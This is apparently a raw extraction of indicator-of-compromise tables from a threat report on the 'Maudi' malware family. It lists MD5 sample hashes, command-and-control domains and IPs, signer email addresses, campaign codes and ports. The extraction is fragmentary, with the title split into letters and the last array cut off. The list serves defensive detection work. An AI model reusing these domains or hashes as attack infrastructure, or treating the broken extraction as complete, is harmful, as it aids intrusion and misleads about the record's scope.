["6bd265f6c8475fa0960c7d044a209ac7"], ["6daed5c526ca48199055dd4ff9b7a224", "897f25fc7069584fe8ffeb0fa1354c7f", "9f2bfebde725c45ea28293e565042791", "c4e655bd456286e33074848d678b75e2", "d430ac30417084c462d8fafea82f4988", "d569bbf270f079587c3232a9dff7e62a", "d943bcd358d0fe244565ad20e41213ff", "df383425f83184b8f4c1b33920d783bf", "e11591816b9da6e9ae8cf24a8a441f16", "e37f67153e1c0de0254cd913ede07189"], ["ea95945fbc95db7789188a04c715b25d", "ed71401d451bb2b870d1141bf1044055", "f57cc074a44ad7d01bf8539aa2a7aa97"], ["031bfe6310e55cf37b431895b4d6e7b1"], ["06c6b86dd9e860a50babce8b30a9105c"], ["0d912cc3eb75a84968f31d2dc3388309", "122596ebc648be17f6c135a35aebff6c", "2f784ecdea8f367c923ec3e5ca31e4e1", "3357bbbf1919605cd1ecbbe8883a90b8"], ["52c7f247f0ee37e50dc218c78fa0af6b", "71f9eb0d957ab9a98cf7386f42802fc5"], ["77de512dca26e078e866b2782809366d", "781987ff8f295bc70a35136aae9d44f0", "7caaf2a6428f98f6b408ff687e681c34", "7d95d5a34e4cf1d11b4066c08d966bab"], ["7dcf1cbd989a3064631aea4cdfa057a7", "90259884e04cb5cd9d511bec0b551f57", "9beffe50ee0c4006724050b295928471", "9ea6e2cb17154cc8e3e5a84bd81c6346", "ad9349a84778094273f5efbc9779139a"], ["subscription.dyndns-home.com", "127.0.0.1", "dnsluck.3322.org", "kfcmakelc.zapto.org", "mylover.dyndns-free.com", "www.microsoft.com", "mysql.sql01.com", "worldnews.zapto.org", "manager.serveblog.net", "blog.cnmgd.org", "127.0.0.1", "dnsabcd.dyndns.biz", "qwer.crabdance.com", "qwer.crabdance.com", "l2009l20091.3322.org", "yhm20060330.3322.org", "fh.buypn.com", "fh.buypn.com"], ["yunlong123.3322.org", "hostname.dyndns-mail.com", "shinubi.chickenkiller.com", "mylover.dyndns-free.com", "single.dyndns.info", "blog.cnmgd.org", "blog.cnmgd.org", "mysql.sql01.com", "dnsabc.3322.org", "dnsluck.3322.org", "127.0.0.1", "worldnews.zapto.org", "dnsluck.3322.org", "hhcc365.zapto.org", "boyfriend101.kicks-ass.org", "subscription.dyndns-home.com", "bbs.avjkv.com", "subscription.dyndns-home.com", "dnsluck.3322.org", "single.dyndns.biz", "mysql.sql01.com", "indiaarmy.djkcc.com", "127.0.0.1", "p.hannmaill.net", "wang2368131.gnway.net", "dnsxyz.dyndns.biz", "mysql.sql01.com", "friend101.7766.org", "boyfriend101.kicks-ass.org", "127.0.0.1", "a5g17mail.3322.org", "misson.mysq1.net", "black204.dyndns-work.com", "a5g17mail.3322.org", "a5g17mail.3322.org", "wang2368131.gnway.net", "wang2368131.gnway.net", "171088046.gnway.net", "114.202.2.83", "limingliang1988.gnway.net", "19", "|", "T", "h"], ["e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com", "in1206", "DD", "Https", "789", "fish", "update", "1014", "zfish"], ["in926", "blog", "xfish", "zfish", "fanhe", "fanhe", "xfish", "01", "fanhe", "fanhe", "yl"], ["in248", "pk", "xfish", "j0220", "blog", "05", "45", "bfish", "kfish", "DD", "zfish", "Https", "0216", "xfish"], ["in1206", "0509", "in216", "https", "jxt1206", "12", "dj", "xfish", "xfish", "xfish", "yfish", "xfish", "nfish", "xfish", "xfish", "xfish", "xfish", "bl", "IN", "IOTY", "xfish", "xfish", "wind", "xfish", "xfish", "80", "3460", "443", "80", "80", "80", "80", "443", "80", "80", "3460", "80", "80", "80", "7750", "3460", "80", "80", "3460", "80", "443", "80", "80", "80", "80", "110", "80", "443", "3460", "443", "443", "443", "5379", "80", "8080", "80", "443", "80", "80", "80", "3460", "3460", "7788", "80", "80", "1723", "5379", "3460", "6200"], ["80", "80", "4014"], ["6200"], ["9900", "7188", "8899", "7088", "8899", "Norman", "Shark", "d2c61fde3b73f7ee8203df78171587d1", "2b849ee3af6557717282682e803cfef1"], ["2c34afcd76256fd8bdbe1129bd01897a"], ["360e5b617649a3b6c9a646aae1d2920a"], ["6315c282ee83eeef8ea9508291f20a92"], ["889dbaeb54629fd311083bc828b13b6a", "9f8a187dbe2c8b06f542c4dc43fd1e80", "a90f5d080952426d3f16838d20de9f1d", "ab23e48eb498a8f601e3c8ed52a7e712"], ["cc77bf82a6546039c14a37b18901e626", "e62560b1f03f3bebfd10726a4c0777bc", "f007fa65ffe2f12524aced70c29abf2a"], ["fe7ce50cbfbe8ca7bd601f49de648d84"], ["0083267bc3d259028f6ccb4a2598e8c9"], ["4c8690b04bb8c996e8ac384ed300f6e3"], ["9d67585daed1a011634b3a53bf545f63", "04fac410eefd0329d037dcaaf063a54c", "0f84951213319e0ab09f94d5eedd932f", "2940e44d8df1eeee9bd7f0a046cbd3bd", "cde25bb92a592a806042629d7e2b8b4c", "cfd8906425ffa8358e7300bbf468e40f"], ["184b3cb15d5df6f9d8063e4ce197206d"], ["82e64f6dadde344885c60b02f488e3b3", "f9b5f626a2587081c5cb008ac9ba2395", "20d29980a228aad1058583d5b7dc413b", "0136ea74a5194649ae8c760604a59cd9"], ["0146877e42a63a65ebac61648e2605fe"], ["3d409c193b4ee5336acaf0fb2d79e1f8", "4018d44d810efcd3db260e94991ef3ee"], ["640cc84d9f12ab2edd65eee6d6241a48", "6a5d2ab03b34009f497d186cc7d0aa8f"], ["7ebfbf3e1b8fe79b45f814174418f2f1"], ["9af111f0f35db2c234b83f2ac5da6289"], ["b74a964fd5c8dea5b7cbe8a686708e00"], ["b8276b916938d6f5ac156817817c728a"], ["9e309be6824bc99429fe037f41587beb"], ["cdc6f442f8b576b7c461ea25891f2905", "0cf15b88b18cdedfaae598e9498768e3", "2b640b94a8abe4767ba17e4036e827f2"], ["49c7cae0fda8e5089e993a169c6c4197", "7c27572d9ce8bd94ea044e7980a09a60"], ["840e670aec18db73ae1c0db204eed229", "914fdaf7aa098ac00067a2b265fc91da", "bd9a1fbd76c00015a59a3b5c93d4030e", "bdc80843e8c2da96880b752308307933", "c64aab79e5107fc8ffd4699288c2e3be", "c9f33d544c5657d4ba55a92e06e38d06", "037d6fbb28222321c6b0ace6305c41ef"], ["1a473ae0967d141a6aadc6731663b37d", "1e60824de00ce3c1f62fddc54a9c5c93", "3817374b73d31d46d74489f36f04b8e6"], ["3a29f097c281b82593220f2ed466f3d6", "409580363a869a861c667c37fbf7212c", "434b3f6a2176290ba2980bb568bae6db", "46de60abab981fb29ed263a94002c8ff", "474ae7cb12e77f43e3b07423e8d2e707", "48499fdbeab3277c3c2cd71e363535c7"], ["552b5252ff52be814e23b1506eeb50ee", "a5g17mail.3322.org", "blog.cnmgd.org", "misson.mysq1.net", "127.0.0.1", "171088046.gnway.org", "rich-yong.gnway.net", "misson.mysq1.net", "mylover.dyndns-free.com", "rich-yong.gnway.net", "mysql.sql01.com"], ["171088046.gnway.net", "371611121.gnway.net", "118.194.238.43", "infasd.crabdance.com", "q944642367.gicp.net", "boyfriend101.kicks-ass.org", "imacarpe.dyndns.tv", "hostname.webhop.net", "whitebird.dyndns.org", "xc.winniqi.com", "game.winniqi.com", "configure.selfip.org", "a5g17mail.3322.org", "dnsabc.webhop.net", "a5g17mail.3322.org", "wang2368131.gicp.net"], ["yahooforusa.vicp.net", "q944642367.gicp.net", "news.lufare.com"], ["zeropan007.3322.org", "surpriseing.homeftp.org", "services.servebbs.org", "wang2368131.gicp.net", "127.0.0.1", "117.40.239.20"], ["oa.sanymh.com", "220.175.13.250", "yt.bodologetee.com", "okia.3322.org", "www.windowsliveupdatecache.com"], ["qqpass.kittyeah.com", "qqpass.kittyeah.com", "www.windowsliveupdatecache.com", "www.windows-liveupdate.com", "bbaolong.vicp.net", "www.windows-liveupdate.com", "www.windows-liveupdate.com", "a5g17mail.3322.org", "a5g17mail.3322.org", "yt.bodologetee.com", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "127.0.0.1", "a5g17mail.3322.org", "20", "|", "T", "h"], ["e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["SoftSign@HotMail.com"], ["SoftSign@HotMail.com"], ["SoftSign@HotMail.com"], ["SoftSign@HotMail.com"], ["SoftSign@HotMail.com"], ["SoftSign@HotMail.com"], ["SoftSign@HotMail.com"], ["SoftSign@HotMail.com"], ["SoftSign@HotMail.com"], ["SoftSign@HotMail.com"], ["SoftSign@HotMail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com"], ["1215", "04", "xfish", "xfish", "xfish", "hl", "xfish", "kfish", "hl", "xfish", "wind", "aabbc", "xfish", "sssss", "hl", "xfish", "0419"], ["IN01", "xfish", "c1130", "s1115"], ["in819", "xfish", "BINGO", "xfish", "8888", "00001", "kor", "xnl80", "0630"], ["628", "IN", "8888", "xfish", "lwwn1", "szc", "4khxb", "-", "do612"], ["beijingnew", "2011a", "krgqy", "\\xB6\\xCE\\xBA\\xBA\\xBD\\xDC"], ["\\xC1\\xD6\\xCA\\xC0\\xB3\\xE7", "qq", "zwdb", "0417zhang", "gzzx"], ["Qbxt", "IN", "xfish", "jiagu", "0427", "IN", "bsbbs", "xfish", "0427"], ["IN", "xfish", "xfish", "6200"], ["80", "80", "3460", "3460", "3460", "80", "80", "3460", "80", "8899", "3460", "3460", "80", "3460", "5379", "80", "80", "5496", "4000", "31", "443", "6200", "80", "6200", "8888", "443", "6666", "80", "8080", "443", "443", "8888", "3460", "8071", "3460", "8080", "4500", "3480", "3460", "35", "35", "3460", "3460", "3460", "3460", "3460", "4014", "6200", "80", "6200", "4014", "6200", "6200", "6200", "4014", "3460", "6200", "Norman", "Shark", "5bcf43e49d6bfbc26ec1f1cd6968ed3e"], ["5d2d6d9fe58355c01e31c0f12ab99bd3", "5db6e16c286363115454690bc5c3da77", "6648c9ffc4f4e705545daaa3c09373fd"], ["69238872045ab0148c581bb8d99a6a1c", "6a71157ee541a78f580f5eebc53b86eb"], ["6e7fc8bac73410b58d4d1b2ce0dcc44e"], ["7fc18dedcc7728b3103d4108557e8fb4", "8fff7ca54103d5de1734b940d165b871", "b443f9a521d7ea56b387d36484df1900", "b5ff5a76ab4cca4a8fc3d2c39b30c997", "b756fb047aff38fb8a2f2778d4b2d392"], ["c64dd5393a17226b208b049a4b766bd6", "cf8861ae0c0525d345a72ac43a767548"], ["d13e4ef3e3791927397baf292182c583"], ["e1fe9adfc62dfe5aee7d7cf3d6e51c29", "f52d6ba37ae65bd02ee5485309c87cdd"], ["f6edfa0c8d35f74374d62309a8436a46", "faffe9b9182709f62de4da91cffe3a5f", "e2a063d5afb6cf892431246013cc3919", "01c142c7bfb0d8655f02eaac5cbe0baf"], ["09cadcb2af2d06dae3a120ff43aa97ac", "1a0ab794b8b590964c9c2d024956ad01"], ["3d4545c40e4f359ad38dde0dae375f18", "52e8c0d7b2572054198b2d4dc401bc47", "538da437660a6a3ff64e9eba44d27423", "55f75ea088c723958bf880391747b7a3"], ["5de88d845578b8782a570c1f808a164c", "64cd92c40c4249dfc03aa9e211605f55", "68ac613a97afdd9a0c58c05908e15e82", "9335bbd44567f56d4f4027cf2d105156", "a085e20215ffed7056ddeb49b0fa8c8c", "a7756ffb6fafc866e9c6ba7a51f162e5", "a7a4fb56c8e7a74490e00146a14d641d", "be7ac4097e8740a280c2daabbc8aac2c", "cf3a539bd308964b357c6d7fdb8e77cd"], ["d745cd51b8497638a8bc7d65f6aea302", "da981c3c8acfdd7a4b1982ceb53d2105", "e2ccc17ad7428516b22d73d7f3d04c88", "eb99559000fa4bffb09f0095b5771f64", "f451140e7ad709b239bfe5b9a9e85ec7"], ["f7427898041410dec0d6ac1a2250838c", "14259ca243aa80e733bdd7d65e518c6d"], ["a27b30f1dedf64900eac64fdb22d51c9", "2fd59b0af3858688487aa5d98f5927d1", "31890debe88cd057c351a64e260682f8"], ["3ec57887caa14d1c7b83a0f7a441b52a", "41d985d0b3a9dfd79da0b39f9a1aa4bf", "46ebbc42670e8e2a0a03654559d54983", "60064d648bc533a38a708dbe5f759034"], ["60111cd0e8372f84df471e71ef9909a7", "64bc0eee75c62da0e997ca3f4e257cdb", "827604d4811d2dfbf34e7de87a48a08e", "8423599f6ffd07d5bc9cc02b3610b0f8", "86142a2eddfadb5d3d879e8a377bec7d", "8891b5aa1125c2b9b4e06158346b1f21", "936721205de8e825b02099f036ad1b61", "96f19f590ebc84ded2a7af4c052fccf2", "a5g17mail.3322.org", "127.0.0.1", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "yt.bodologetee.com", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "a5g17mail.3322.org", "zfyxu.gicp.net", "bbaolong.vicp.net"], ["olk4.3322.org", "olk4.3322.org", "www.windowsliveupdatecache.com", "dog.aumoni.com", "okia.3322.org", "tigertigertiger.3322.org", "www.windows-liveupdate.com", "www.windows-liveupdate.com", "liyanyanzy.3322.org"], ["tb801.co.cc", "tigertigertiger.3322.org", "www.windows-liveupdate.com", "qqpass.kittyeah.com", "liyanyanzy.tk", "qqpass.kittyeah.com", "sunnyrone.coyo.eu", "okia.3322.org", "tb-20110112.3322.org", "yangjinxiu.vicp.net", "liyanyanzy.3322.org", "veidu.uicp.net", "xyxf110.3322.org", "csfox.3322.org"], ["jiangshan2368131.3322.org", "127.0.0.1", "yunlong123.3322.org", "asiondragon2008.3322.org", "bafeite518.vicp.net", "www.zone.qpoe.com", "terry0707.vicp.cc", "bbaolong.vicp.net", "axna.5166.info"], ["jiangshan2368131.3322.org"], ["jiangshan2368131.3322.org", "axna.5166.info"], ["jiangshan2368131.3322.org", "jiangshan2368131.3322.org", "21", "|", "T", "h"], ["e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "CeleSign@hotmail.com"], ["CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "CeleSign@hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com", "DataBase@Hotmail.com"], ["goodw@hotmail.com"], ["goodw@hotmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com", "IN", "xfish", "bsbbs", "IOTY", "xfish"], ["IN", "IN", "IN", "bsbbs", "xfish", "IOTY", "xfish", "jiagu", "0427"], ["IOTY", "IN"], ["xfish", "bsbbs", "xfish", "301", "0417zhang", "xzang", "xfish", "qq", "d0306", "2011a", "tiger", "gzzx"], ["Qbxt", "juesh", "hktbb", "tiger", "zwdb"], ["Lobsternz", "tkkkk", "\\xB6\\xCE\\xBA\\xBA\\xBD\\xDC"], ["12345", "fant1", "tb", "12345", "shenf", "12345", "xfish", "BoerS", "xfish", "se", "xfish", "GM164", "eeeee", "71", "xfish", "1012", "xfish", "xfish", "xfish", "xxx", "xfish", "xfish", "4014", "3460", "6200", "6200", "6200", "4014", "4014", "4014", "6200", "6200", "6200", "6200", "80", "6200", "6200", "4014", "6200", "6200", "6200", "1983", "3460", "3460", "3460", "3460", "1258", "3480", "80", "3460", "3460", "80", "3460", "80", "3460", "5960", "80", "35", "80", "3480", "3460", "80", "80", "80", "3460", "3460", "3460", "32", "5555", "3460", "3460", "80", "3460", "3460", "3460", "3460", "3460", "3460", "3460", "3460", "Norman", "Shark"], ["97cba74ed66a650403c16c6aca96d608"], ["9e890216c8c880c5c4859a77894c8210"], ["b13352f5a17d3eb3937ea9cbbdd142cf", "b5ba974dadb886bcdd826a3692915d3a", "bf973493fd8d7c097d26ecc1c1a75b96", "c364c68e36f7d864dc78a1778eb0b262", "d0f62109a38e0dbafcc1a3fefecfd09c"], ["df5be665924cfd5898c189c91a79322f", "f07b20c47dee2362ea66b57a96acc7ed"], ["c93f8a7a899142db1e92138b76407588", "a25e5bcc52c386eb046149799ed81b2b"], ["646cfe960219f1948eac580e3bd836f8", "e3ef377d4ed4b8c0fca7b893f4074ce0", "04ce6965a52bb87cc070077678f5e323", "081e01fecdd47346a55e5a8a13b0720c", "0bdacf6e88263c85a669b84692a337b1"], ["b030c0d878997350a7dd1f0533090846", "e95432553f5d6ddaadad8a634a9a3e7d", "ef1de280764dfa67abdfe3928932a6a2"], ["da52a58fa6f45fd8ede22a0618cb7260"], ["103b21042f60d6904a819d504a7b1be1", "10cfadfb49b1ca15563b20e72ffde76f", "772447c014c0ef465313fb8865d3c501"], ["7d36ad6aafbf1f9496ccc6ac1a8bb57e", "882b1e94652a6ee0377380d2b7c74de5", "1ce83eb64757f30737aebfc177ff681b"], ["429bc1afd27b39a26494c868a4013eaa"], ["64718689ee3ff695c55ea1ec213434d1", "8a3ca42ee9b67c4d030ee9d5193fd8b8"], ["8ae26d583509b9eea207126b29121459", "fda1664e10e36c833a1aceae3688fc73"], ["04045fd7863c2512da99d69bbe7ceb43"], ["09a291e91adc6a994499fb27e7fae65c"], ["1a087cdeac6ee8169fa9f0359403091b", "1f3065accfe697c56f45b641659f6418", "3e7ba528aa87d0ec6a24c643e5527391", "4b386d215a650280b685837e3a11b126"], ["51c318d9f127a1f2fc112e22105cb5fb"], ["6abf57bc4621a8f5e3153cb3c10353a2"], ["84ae8974750c2993aa409e048c940c69", "9f33a565837211d126ef48a518b14971", "a07f6cf0029adbf16e8b7c644c26ce81"], ["aa056a0ac5d81d0fb7974702861ea827"], ["b38b53f6a04c2f42433bef80df18998a", "b65f394d07a665dadab98b3fdcfec25f", "e866043cf627b6ef4d13a820e314a99c", "fe4df2b266a570fc041a1a1cdd5451f2", "0ca360ef2797bee54b53e5a34d47f3e4"], ["8f0b13f9111241132e1c0738f5b03227", "6d869c47d1930ea7fc054f22d49402ff", "044d8a1f538cc875c4222272984a6193", "0eb634f8e1ce366b8b7216024590df2b"], ["20aa76dcd2bb2925d8d5fda4a39f5947"], ["2e81515f8323a4481e1bdcc4e5193d99"], ["35c355c051d911d34bf9fae984973fb9", "48a8e6dc1e9b11a0c2aecf6fcd1d8d03", "4dd04d65e16f6147a8427f548fd1f9a3", "55b2c4e0d2d036910a014167dab5c8f9", "bafeite518.vicp.net", "axna.5166.info", "bafeite518.vicp.net", "bafeite518.vicp.net", "bafeite518.vicp.net", "axna.5166.info", "atneh.vicp.net", "terry0707.vicp.cc", "bafeite518.vicp.net", "www.mol-government.com"], ["www.newsyandex.com", "yt.bodologetee.com", "bafeite518.vicp.net"], ["jiangshan2368131.3322.org", "jiangshan2368131.3322.org", "long1235.3322.org", "long1235.3322.org", "long1235.3322.org", "long1235.3322.org", "bafeite518.vicp.net", "monalisa88188.3322.org", "220.175.13.250", "asion-2009.gicp.net", "ns2.adultstick.com", "asion-2009.gicp.net", "bafeite518.vicp.net", "iamflying.3322.org", "ns2.adultstick.com", "monalisa88188.3322.org", "asion-2009.gicp.net", "xxxxxxxxxx", "asiondragon2008.3322.org", "yunlong123.3322.org", "axna.5166.info", "bbaolong.vicp.net", "axna.5166.info", "xyxf110.3322.org", "xyxf110.3322.org", "bafeite518.vicp.net"], ["59.50.99.83", "www.zone.qpoe.com"], ["csfox.3322.oRg"], ["jiangshan2368131.3322.org", "127.0.0.1", "CsFoX.3322.OrG"], ["jiangshan2368131.3322.org", "terry0707.vicp.cc", "jiangshan2368131.3322.org", "long1235.3322.org", "bafeite518.vicp.net", "csfox.3322.org", "bafeite518.vicp.net", "csFOX.3322.orG"], ["csfox.3322.oRg"], ["jiangshan2368131.3322.org", "csFOX.3322.orG", "asion-2009.gicp.net", "asion-2009.gicp.net", "22", "|", "T", "h"], ["e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["laker@gmail.com"], ["micro@CeleWare", "."], ["NET", "microsoft@CeleWare", "."], ["NET"], ["microsoft@hotmail.com"], ["xyblack@gmail.com"], ["xyblack@gmail.com"], ["xyblack@gmail.com"], ["xyblack@gmail.com"], ["xyblack@gmail.com"], ["xyblack@gmail.com"], ["xyblack@gmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com", "eeeee", "xfish", "eeeee", "eeeee", "eeeee", "xfish", "xfish", "xfish", "eeeee", "text1", "shiww", "xfish", "xfish", "xfish", "xfish", "xfish", "xfish", "fjian", "mengn", "xfish"], ["ND906"], ["lrqdz", "ND906", "minzh", "baiyi", "lrqdz", "mengn", "ND906", "xxxxx", "GM164", "xfish", "xfish", "1012", "xxx", "xfish", "new6", "eeeee", "xfish", "71", "TWB", "xfish", "se", "foxtt", "xfish", "xfish", "xfish", "xfish", "shiww", "R3461", "tuya", "T9158", "TWB", "xfish", "T9158", "GM1.6", "GM1.6", "3460", "3460", "3460", "3460", "3460", "3460", "3600", "3460", "3460", "3460", "80", "6006", "3460", "3460", "3460", "6000", "6000", "6000", "6000", "3460", "3480", "8080", "3460", "3460", "3460", "3460", "3460", "3460", "3480", "3460"], ["94", "3460", "5555", "3460", "3460", "3460", "3460", "3460", "3460", "8080", "80", "3460", "3460", "32", "3460", "3460", "3460", "3460", "6000", "3460", "3461", "3460", "3460", "3460", "3460", "3460", "3460", "3460", "Norman", "Shark", "570a80412467a33ffddc94ad443b92fc"], ["59c22dca8bfcae8a6c3f9f6c6834ad33", "5bb9ce4a13c1aab97a3923d8b857fdfd", "5d36836932d43389780b8100245b28d0"], ["5fa7bbabb2463fcc56c13dae5826784a"], ["615fe8b63bcb6575185dfc996ca18e04", "7279b27dfd686f41d212c06d40bc09a0"], ["89819111ce917666c5865b98041db9c4"], ["ad317df6bcc6a9cd5ec08a5177d3300b", "b424b010732c6b21c3d811e26fdedeaf", "c9ee85547bca1825514e921c66fbc2fc", "dca6b6a12df13964bc4d56a7a2e5690c", "e8fc2905195b38945649b38018c395e0", "4dcc921959c7769fdfe0e6a65bff29a3"], ["6a51c68b272fa6364cf812c6c488f399", "d75140218ffbba6663704b6a4be1d752", "03d576b3d29ea70714ca28a8704d2063", "0bd321879f9e7949ea2bf8c82496d404"], ["36af416dd751d2531f69877469b601d9", "4108daddc9cbc28e812c4325ae9c22de", "b6ebe0a76cbf24bc4b0a8bf0b8f20205", "c067c295fa72381c0bdeea4273b4bb4c", "d26f9684c391f69fc6326fa3d71c1018"], ["ef4a862e2ba601053647a4b297d2b8b3"], ["f057ccc37f20cb8425b7f8975047bba8"], ["fbfecc5078c3336ae53db41a148e8c74", "542f45c05e68e0884d25f3a2681b2235", "86fa64581f38f423085339d0e0639a44"], ["dedc3879f1af489cbcf2b85b3b25f13f", "fa1379f3e680dfe7b679cb38ac66b758", "42c3cc80a11ad69afcaca051ce23392a", "5ad33406e1c7f36034b99ab4d820e39f", "623e3db25c43184ec044d646dd1df4a2"], ["6d9234f17a16dabdc83c757fc7052849", "d2235d2276f0dc410db5422c6e0f716c", "da203dcaee67c1b7d9094e77e0b61d21", "f0baccf99bae6fbdde4463b87e0e8733", "3f95b9dd7547044b23e31ee01745fd8f", "0db89a0cc2cf2a88c40ea8e76c7c0834", "0f4d03353b172639ed43410061f5eb8f"], ["4d95a416bef7eeffee2837596755a476"], ["52427aabdf5bf61e818ca343ed35b5fd", "b8d0556df19fee8485f5581ddc4fea8c", "e75150f613f593ffe8ade4ce3db6fc7e", "ef404a76bd11e1d675b7686775ed7f1c", "3f795be50edfe011167a479e735078e2", "49dcf66fe12703789cf5074a5c222211", "74eabedd7a9bce6973f5ac5d2e1404c5", "f554c212f314e15388e33a62ce88cd34", "1042efb418f845f362f302b63d4d3c77"], ["d9203e00ff7b2edb01f52b378e3386be"], ["7d4d78d1dacfeaad46c6506522ad61c2", "95881cd633b682cda181d22b5f5efc12", "ba9d43b3f1e81e0cca615e19a0f20bdc", "f3f29866a50b82da0eee22b016af5bdc"], ["csfox.3322.org"], ["jiangshan2368131.3322.org"], ["jiangshan2368131.3322.org", "bafeite518.vicp.net", "xyxf110.3322.org", "CsFoX.3322.OrG", "bafeite518.vicp.net", "csfox.3322.org", "CsFoX.3322.OrG"], ["jiangshan2368131.3322.org", "CSfox.3322.Org", "bafeite518.vicp.net"], ["59.50.99.83", "paladin666.gicp.net", 